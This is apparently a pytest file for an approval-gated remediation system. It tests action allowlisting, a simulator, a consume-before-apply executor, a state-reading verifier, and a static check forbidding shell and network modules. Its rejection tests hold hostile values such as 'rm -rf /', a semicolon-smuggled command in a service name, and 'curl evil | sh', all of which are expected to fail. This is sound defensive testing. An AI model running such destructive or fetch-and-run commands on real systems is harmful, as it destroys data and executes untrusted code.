"""
tests/test_remediation.py — Stage 4 building blocks: allowlisted actions, the
deterministic simulator, the consume-gated executor, the independent verifier
and the validated-outcome retention rule. No real infrastructure, no network.
"""

import ast
import glob
import os
from datetime import datetime, timedelta, timezone

import pytest

from approvals import ApprovalDenied, ApprovalService, ApprovalStore
from memory import MemoryRecorder
from memory.fake_memory import FakeMemory
from remediation import (
    InvalidAction, RemediationExecutor, RemediationVerifier, SimulatedEnvironment, SimulationError,
    parse_action, record_verified_outcome, retention_decision,
)

INC = "INC-SIM-001"
ROLLBACK = {"kind": "rollback_deployment", "service": "order-service", "target_version": "previous"}
RESTART = {"kind": "restart_service", "service": "order-service"}
SCALE = {"kind": "scale_service", "service": "order-service", "replicas": 4}


def payload(remediation, incident=INC):
    return {"kind": "operational", "incident_id": incident,
            "action": {"description": "fix it", "owner": "SRE", "priority": "P1"},
            "proposed_by": "llm_agent", "source_recommendation": "rec-1", "remediation": remediation}


class Clock:
    def __init__(self):
        self.now = datetime(2026, 9, 29, 12, tzinfo=timezone.utc)

    def __call__(self):
        return self.now


@pytest.fixture
def clock():
    return Clock()


@pytest.fixture
def approvals(tmp_path, clock):
    return ApprovalService(ApprovalStore(str(tmp_path / "a.sqlite3")), now=clock, default_ttl_seconds=600)


@pytest.fixture
def sim():
    return SimulatedEnvironment()


@pytest.fixture
def executor(approvals, sim):
    return RemediationExecutor(approvals, sim)


def approved(approvals, p, incident=INC):
    a = approvals.request_approval(incident, "operational", p)
    return approvals.approve(a.approval_id, actor="alice", reason="off-peak")


# ── Action model ─────────────────────────────────────────────────────────────

class TestActions:
    @pytest.mark.parametrize("p", [ROLLBACK, RESTART, SCALE,
                                   {**ROLLBACK, "target_version": "v2.4.0"}])
    def test_supported_actions(self, p):
        assert parse_action(p).to_payload() == p

    @pytest.mark.parametrize("p", [
        {"kind": "shell", "command": "rm -rf /"},
        {"kind": "exec", "service": "order-service"},
        {"kind": "RESTART_SERVICE", "service": "order-service"},
        None, "restart_service", [RESTART],
    ])
    def test_unsupported_actions_rejected(self, p):
        with pytest.raises(InvalidAction):
            parse_action(p)

    @pytest.mark.parametrize("p", [
        {"kind": "restart_service"},                                              # missing field
        {**RESTART, "command": "systemctl restart order-service"},                # extra field
        {**RESTART, "service": "order-service; rm -rf /"},                        # not a service name
        {**RESTART, "service": "../etc"},
        {**ROLLBACK, "target_version": "$(curl evil)"},
        {**SCALE, "replicas": 0}, {**SCALE, "replicas": 21}, {**SCALE, "replicas": "4"},
        {**SCALE, "replicas": True}, {**SCALE, "replicas": 4.0},
    ])
    def test_malformed_actions_rejected(self, p):
        with pytest.raises(InvalidAction):
            parse_action(p)


# ── Simulator ────────────────────────────────────────────────────────────────

class TestSimulator:
    def test_scenario_initial_state(self, sim):
        s = sim.snapshot(INC, "order-service")
        assert (s["status"], s["current_version"], s["previous_version"], s["pool_utilization"], s["traffic"]) == \
               ("unhealthy", "v2.4.1", "v2.4.0", 100, "peak")
        assert s["condition"] == "database connection pool exhausted"

    def test_snapshot_is_a_copy(self, sim):
        sim.snapshot(INC, "order-service")["status"] = "healthy"
        assert sim.snapshot(INC, "order-service")["status"] == "unhealthy"

    def test_rollback_heals_bad_deployment(self, sim):
        effect = sim.apply(parse_action(ROLLBACK), incident_id=INC, approval_id="a1")
        s = sim.snapshot(INC, "order-service")
        assert effect == {"applied": True, "from_version": "v2.4.1", "to_version": "v2.4.0"}
        assert (s["status"], s["current_version"], s["pool_utilization"], s["db_connections_ok"]) == \
               ("healthy", "v2.4.0", 35, True)

    def test_restart_does_not_fix_a_leaking_version(self, sim):
        sim.apply(parse_action(RESTART), incident_id=INC, approval_id="a1")
        s = sim.snapshot(INC, "order-service")
        assert s["restarts"] == 1 and s["status"] == "unhealthy"

    def test_restart_fixes_transient_exhaustion(self, sim):
        sim.apply(parse_action(RESTART), incident_id="INC-SIM-002", approval_id="a1")
        assert sim.snapshot("INC-SIM-002", "order-service")["status"] == "healthy"

    def test_rollback_without_target_is_not_applied(self, sim):
        effect = sim.apply(parse_action(ROLLBACK), incident_id="INC-SIM-003", approval_id="a1")
        assert effect["applied"] is False and effect["reason"] == "target_version_unavailable"
        assert sim.snapshot("INC-SIM-003", "order-service")["current_version"] == "v2.4.1"

    def test_scale_is_capped_by_quota(self, sim):
        sim.apply(parse_action({**SCALE, "replicas": 8}), incident_id="INC-SIM-004", approval_id="a1")
        assert sim.snapshot("INC-SIM-004", "order-service")["replicas"] == 6

    def test_same_approval_cannot_be_applied_twice(self, sim):
        sim.apply(parse_action(RESTART), incident_id="INC-SIM-002", approval_id="a1")
        with pytest.raises(SimulationError):
            sim.apply(parse_action(RESTART), incident_id="INC-SIM-002", approval_id="a1")

    def test_unknown_incident_or_service(self, sim):
        with pytest.raises(SimulationError):
            sim.snapshot("INC-REAL-9")
        assert not sim.has_service(INC, "payment-service") and not sim.has_service("INC-REAL-9", "order-service")


# ── Executor: consume is the authorization boundary ──────────────────────────

class Spy:
    """Wraps the approval service and simulator, logging the order of calls."""

    def __init__(self, approvals, sim, log, *, fail_consume=None):
        self._approvals, self._sim, self.log, self.fail_consume = approvals, sim, log, fail_consume

    # approval service side
    def validate(self, *a, **k):
        self.log.append("validate")
        return self._approvals.validate(*a, **k)

    def consume(self, *a, **k):
        self.log.append("consume")
        if self.fail_consume:
            raise ApprovalDenied(self.fail_consume)
        return self._approvals.consume(*a, **k)


class SimSpy:
    def __init__(self, sim, log):
        self._sim, self.log = sim, log

    def has_service(self, *a, **k):
        return self._sim.has_service(*a, **k)

    def snapshot(self, *a, **k):
        return self._sim.snapshot(*a, **k)

    def apply(self, *a, **k):
        self.log.append("apply")
        return self._sim.apply(*a, **k)


class TestExecutor:
    def test_order_is_validate_consume_apply(self, approvals, sim):
        log = []
        a = approved(approvals, payload(ROLLBACK))
        result = RemediationExecutor(Spy(approvals, sim, log), SimSpy(sim, log)).execute(
            a.approval_id, incident_id=INC, payload=payload(ROLLBACK))
        assert log == ["validate", "consume", "apply"]
        assert result.trace == ["checked_action", "validated", "consumed", "executed"]
        assert result.status == "executed" and approvals.get(a.approval_id).status == "consumed"
        assert result.before["current_version"] == "v2.4.1"

    @pytest.mark.parametrize("code", ["consumed", "expired", "conflict"])
    def test_if_consume_fails_nothing_is_applied(self, approvals, sim, code):
        log = []
        a = approved(approvals, payload(ROLLBACK))
        result = RemediationExecutor(Spy(approvals, sim, log, fail_consume=code), SimSpy(sim, log)).execute(
            a.approval_id, incident_id=INC, payload=payload(ROLLBACK))
        assert log == ["validate", "consume"] and "apply" not in log
        assert (result.status, result.reason) == ("not_authorized", code)
        assert sim.snapshot(INC, "order-service")["current_version"] == "v2.4.1"

    def test_approval_is_required(self, executor, sim):
        result = executor.execute("apr_missing", incident_id=INC, payload=payload(ROLLBACK))
        assert (result.status, result.reason) == ("not_authorized", "not_found")
        assert sim.snapshot(INC)["applied"] == []

    def test_pending_cannot_execute(self, executor, approvals, sim):
        a = approvals.request_approval(INC, "operational", payload(ROLLBACK))
        assert executor.execute(a.approval_id, incident_id=INC, payload=payload(ROLLBACK)).reason == "pending"
        assert sim.snapshot(INC)["applied"] == []

    def test_rejected_cannot_execute(self, executor, approvals, sim):
        a = approvals.request_approval(INC, "operational", payload(ROLLBACK))
        approvals.reject(a.approval_id, actor="bob", reason="peak traffic")
        assert executor.execute(a.approval_id, incident_id=INC, payload=payload(ROLLBACK)).reason == "rejected"
        assert sim.snapshot(INC)["applied"] == []

    def test_expired_cannot_execute(self, executor, approvals, sim, clock):
        a = approved(approvals, payload(ROLLBACK))
        clock.now += timedelta(hours=1)
        assert executor.execute(a.approval_id, incident_id=INC, payload=payload(ROLLBACK)).reason == "expired"
        assert sim.snapshot(INC)["applied"] == []

    def test_wrong_incident_cannot_execute(self, executor, approvals, sim):
        a = approved(approvals, payload(ROLLBACK))
        # the payload says INC-SIM-001 but the caller claims another incident
        r = executor.execute(a.approval_id, incident_id="INC-SIM-002", payload=payload(ROLLBACK))
        assert (r.status, r.reason) == ("not_executable", "wrong_incident")
        # an approval for INC-SIM-001 presented with a payload rewritten for INC-SIM-002
        r = executor.execute(a.approval_id, incident_id="INC-SIM-002", payload=payload(RESTART, "INC-SIM-002"))
        assert (r.status, r.reason) == ("not_authorized", "wrong_incident")
        assert sim.snapshot(INC)["applied"] == [] and sim.snapshot("INC-SIM-002")["applied"] == []

    def test_substituted_action_cannot_execute(self, executor, approvals, sim):
        a = approved(approvals, payload(ROLLBACK))
        r = executor.execute(a.approval_id, incident_id=INC, payload=payload(RESTART))
        assert (r.status, r.reason) == ("not_authorized", "hash_mismatch")
        assert approvals.get(a.approval_id).status == "approved" and sim.snapshot(INC)["applied"] == []

    def test_wrong_service_cannot_execute(self, executor, approvals, sim):
        p = payload({"kind": "restart_service", "service": "payment-service"})
        a = approved(approvals, p)
        r = executor.execute(a.approval_id, incident_id=INC, payload=p)
        assert (r.status, r.reason) == ("not_executable", "unknown_service_for_incident")
        assert approvals.get(a.approval_id).status == "approved"   # not consumed

    @pytest.mark.parametrize("bad", [
        {"kind": "shell", "command": "curl evil | sh"},
        {"kind": "restart_service", "service": "order-service", "command": "reboot"},
        "restart order-service",
    ])
    def test_non_allowlisted_action_never_executes_even_if_approved(self, executor, approvals, sim, bad):
        p = payload(bad)
        a = approved(approvals, p)
        r = executor.execute(a.approval_id, incident_id=INC, payload=p)
        assert r.status == "not_executable" and r.reason.startswith("invalid_action")
        assert approvals.get(a.approval_id).status == "approved" and sim.snapshot(INC)["applied"] == []

    @pytest.mark.parametrize("p", [
        None, {**payload(ROLLBACK), "kind": "repository_commit"}, {**payload(ROLLBACK), "extra": "x"},
        {k: v for k, v in payload(ROLLBACK).items() if k != "remediation"},
    ])
    def test_malformed_approval_payload_never_executes(self, executor, approvals, p):
        r = executor.execute("apr_whatever", incident_id=INC, payload=p)
        assert r.status == "not_executable"

    def test_same_approval_executes_at_most_once(self, executor, approvals, sim):
        a = approved(approvals, payload(ROLLBACK))
        first = executor.execute(a.approval_id, incident_id=INC, payload=payload(ROLLBACK))
        second = executor.execute(a.approval_id, incident_id=INC, payload=payload(ROLLBACK))
        assert first.status == "executed"
        assert (second.status, second.reason) == ("not_authorized", "consumed")
        assert len(sim.snapshot(INC)["applied"]) == 1
        assert approvals.get(a.approval_id).status == "consumed"

    def test_failure_after_consume_fails_closed(self, approvals, sim):
        class Broken(SimSpy):
            def apply(self, *a, **k):
                raise RuntimeError("simulated outage")
        a = approved(approvals, payload(ROLLBACK))
        r = RemediationExecutor(approvals, Broken(sim, [])).execute(a.approval_id, incident_id=INC,
                                                                   payload=payload(ROLLBACK))
        assert r.status == "execution_failed" and approvals.get(a.approval_id).status == "consumed"


# ── Verifier: reads state, not the executor's report ─────────────────────────

class TestVerifier:
    def run(self, approvals, sim, remediation, incident=INC):
        a = approved(approvals, payload(remediation, incident), incident)
        ex = RemediationExecutor(approvals, sim).execute(a.approval_id, incident_id=incident,
                                                         payload=payload(remediation, incident))
        assert ex.status == "executed"
        return ex, RemediationVerifier(sim).verify(incident_id=incident, action=ex.action, before=ex.before)

    def test_successful_rollback_verifies(self, approvals, sim):
        _, v = self.run(approvals, sim, ROLLBACK)
        assert v.verified and v.failure_reason is None
        assert {c["name"]: c["passed"] for c in v.checks} == {
            "deployed_version": True, "service_status": True, "db_connections_ok": True,
            "pool_utilization_below_90": True}
        assert v.observed_state["current_version"] == "v2.4.0" and v.incident_id == INC

    def test_restart_on_leaking_version_executes_but_does_not_verify(self, approvals, sim):
        ex, v = self.run(approvals, sim, RESTART)
        assert ex.status == "executed" and v.verified is False
        assert "service_status" in v.failure_reason
        assert next(c for c in v.checks if c["name"] == "restarted")["passed"] is True

    def test_rollback_with_unavailable_target_does_not_verify(self, approvals, sim):
        ex, v = self.run(approvals, sim, ROLLBACK, "INC-SIM-003")
        assert ex.effect["applied"] is False and v.verified is False
        assert "deployed_version" in v.failure_reason

    def test_scale_beyond_quota_does_not_verify(self, approvals, sim):
        _, v = self.run(approvals, sim, {**SCALE, "replicas": 8}, "INC-SIM-004")
        replicas = next(c for c in v.checks if c["name"] == "replicas")
        assert v.verified is False and (replicas["expected"], replicas["observed"]) == (8, 6)

    def test_scale_within_quota_verifies(self, approvals, sim):
        assert self.run(approvals, sim, SCALE, "INC-SIM-004")[1].verified

    def test_verifier_ignores_the_executor_claim(self, sim):
        """A forged 'success' report changes nothing: the verifier reads the simulator."""
        v = RemediationVerifier(sim).verify(incident_id=INC, action=ROLLBACK,
                                            before=sim.snapshot(INC, "order-service"))
        assert v.verified is False


# ── Validated-outcome retention ──────────────────────────────────────────────

class TestOutcomeRetention:
    def test_verified_outcome_produces_validated_memory(self, approvals, sim):
        memory = FakeMemory()
        ex, v = TestVerifier().run(approvals, sim, ROLLBACK)
        record = approvals.get(ex.approval_id)
        out = record_verified_outcome(MemoryRecorder(memory), approval=record, execution=ex.to_dict(),
                                      verification=v.to_dict(), profile={"pattern_tags": ["DB_POOL_EXHAUSTED"]})
        assert out["retained"] is True
        by_type = {r.metadata["event_type"]: r for r in memory.records()}
        assert set(by_type) == {"human_decision", "action", "verification", "lesson"}
        assert "APPROVED by alice" in by_type["human_decision"].content
        assert "Recovered: yes" in by_type["verification"].content
        assert "verified to restore service" in by_type["lesson"].content

    def test_unverified_outcome_is_not_retained(self, approvals, sim):
        memory = FakeMemory()
        ex, v = TestVerifier().run(approvals, sim, RESTART)
        out = record_verified_outcome(MemoryRecorder(memory), approval=approvals.get(ex.approval_id),
                                      execution=ex.to_dict(), verification=v.to_dict(), profile={})
        assert out == {"retained": False, "reason": "verification failed: outcome is not validated knowledge",
                       "outcomes": []}
        assert memory.records() == []

    def test_retention_requires_decision_execution_and_verification(self, approvals):
        a = approved(approvals, payload(ROLLBACK))            # approved, not consumed
        ok_exec, ok_ver = {"status": "executed"}, {"verified": True}
        assert retention_decision(approval=a, execution=ok_exec, verification=ok_ver)[0] is False
        assert retention_decision(approval=None, execution=ok_exec, verification=ok_ver)[0] is False

    def test_execution_works_without_memory(self, approvals, sim):
        ex, v = TestVerifier().run(approvals, sim, ROLLBACK)
        out = record_verified_outcome(None, approval=approvals.get(ex.approval_id), execution=ex.to_dict(),
                                      verification=v.to_dict(), profile={})
        assert v.verified and out["retained"] is False and out["reason"] == "long-term memory not configured"


# ── Static safety: no way to reach real infrastructure ───────────────────────

FORBIDDEN_MODULES = {"subprocess", "socket", "paramiko", "fabric", "kubernetes", "docker", "pexpect",
                     "requests", "httpx", "urllib", "asyncio.subprocess", "shutil"}
FORBIDDEN_CALLS = {"system", "popen", "spawnl", "spawnv", "execv", "execl", "eval", "exec", "__import__"}


@pytest.mark.parametrize("path", sorted(
    glob.glob(os.path.join(os.path.dirname(__file__), "..", "remediation", "*.py"))
    + [os.path.join(os.path.dirname(__file__), "..", "agent", n) for n in ("remediation_flow.py", "approval_flow.py")]))
def test_no_shell_network_or_cluster_access(path):
    tree = ast.parse(open(path, encoding="utf-8").read())
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                assert alias.name.split(".")[0] not in FORBIDDEN_MODULES, (path, alias.name)
        elif isinstance(node, ast.ImportFrom):
            assert (node.module or "").split(".")[0] not in FORBIDDEN_MODULES, (path, node.module)
        elif isinstance(node, ast.Call):
            name = getattr(node.func, "attr", None) or getattr(node.func, "id", None)
            assert name not in FORBIDDEN_CALLS, (path, name)


def test_executor_does_not_depend_on_long_term_memory():
    import remediation.executor as ex_mod
    tree = ast.parse(open(ex_mod.__file__, encoding="utf-8").read())
    modules = {n.module for n in ast.walk(tree) if isinstance(n, ast.ImportFrom)}
    modules |= {a.name for n in ast.walk(tree) if isinstance(n, ast.Import) for a in n.names}
    assert not any(m and m.split(".")[0] in ("memory", "hindsight_client") for m in modules)
